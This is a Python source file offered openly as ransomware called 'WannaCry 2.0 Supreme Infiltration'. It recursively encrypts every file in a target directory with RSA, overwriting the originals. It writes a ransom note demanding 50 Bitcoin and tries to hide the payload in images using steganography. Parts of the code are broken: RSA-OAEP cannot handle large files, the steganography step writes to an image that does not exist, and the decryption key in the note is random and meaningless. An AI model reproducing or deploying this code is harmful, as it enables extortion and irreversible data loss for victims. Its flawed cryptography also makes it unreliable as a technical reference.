# WannaCry 2.0 Supreme Infiltration
####################################
# WannaCry 2.0 Supreme Infiltration
# Author: 1cYinfinity
# License: MIT License
####################################
import os
import random
import string
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from stegano import lsb

def encrypt_file(file_path, public_key):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = encrypt_data(data, public_key)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)
    create_readme(file_path)

def encrypt_data(data, public_key):
    cipher = PKCS1_OAEP.new(public_key)
    return cipher.encrypt(data)

def create_readme(file_path):
    readme_content = f"""
    Your files have been encrypted by WannaCry 2.0 Supreme Infiltration!

    To decrypt your files, you must pay a ransom of 50 Bitcoin to the following address:

    Bitcoin Address: [Your Bitcoin Address]

    Once payment is confirmed, contact us at [Your Email Address] with the unique key: {generate_key()}
    """
    with open(os.path.join(os.path.dirname(file_path), 'README_WANNACRY.txt'), 'w') as readme:
        readme.write(readme_content)

def generate_key():
    key_length = 256
    return ''.join(random.choices(string.ascii_letters + string.digits, k=key_length))

def find_target_directory():
    # Dynamically find the best target directory (you can customize this logic)
    current_directory = os.getcwd()
    return os.path.join(current_directory, 'target')

def hide_payload(file_path):
    # Hide encrypted payload in an image using LSB steganography with randomized filenames
    secret_message = open(file_path, 'rb').read()
    encrypted_payload = encrypt_data(secret_message, RSA.generate(2048).publickey())
    cover_image_filename = f"{generate_key()}.png"
    cover_image_path = os.path.join(os.path.dirname(file_path), cover_image_filename)
    cover_image = lsb.hide(cover_image_path, encrypted_payload)
    cover_image.save(cover_image_path)

def main():
    # Dynamically find the best target directory
    target_directory = find_target_directory()

    # Load public key for encryption
    with open('PUBLIC_KEY.pem', 'rb') as public_key_file:
        public_key = RSA.import_key(public_key_file.read())

    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, public_key)
            hide_payload(file_path)

if __name__ == "__main__":
    main()
